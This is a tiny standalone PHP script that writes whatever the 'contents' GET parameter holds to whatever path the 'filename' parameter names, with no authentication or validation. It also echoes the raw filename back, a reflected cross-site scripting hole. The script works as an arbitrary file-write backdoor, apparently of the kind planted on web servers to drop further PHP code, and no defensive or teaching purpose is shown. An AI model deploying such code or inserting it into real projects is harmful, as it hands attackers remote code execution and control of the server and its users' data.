<?php

if(isset($_GET['filename']) && !empty($_GET['filename'])) {
	
	$File = $_GET['filename'];
	$Handle = fopen($File, 'w');
	$Data = $_GET['contents']; 
	fwrite($Handle, $Data);  
	fclose($Handle); 
}
else {
	echo $_GET['filename'];
	echo 'fail';
}


?>